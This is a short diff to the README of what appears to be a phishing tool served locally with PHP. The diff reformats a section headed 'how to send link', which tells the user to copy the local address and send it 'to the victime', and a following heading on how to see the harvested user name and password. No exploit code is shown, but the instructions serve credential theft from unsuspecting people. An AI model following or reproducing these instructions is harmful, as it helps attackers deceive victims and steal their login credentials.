@@ -30,16 +30,12 @@ php -S 127.0.0.1:8080
 
  ```   
 ## how to send link :
-
-
-```bash
   coppy 👇
-
+```bash
   127.0.0.1:8080 
-  
+  ```
   👆then send it to then victime
 
-```
 
 ## how to see the user name and pass : 
 
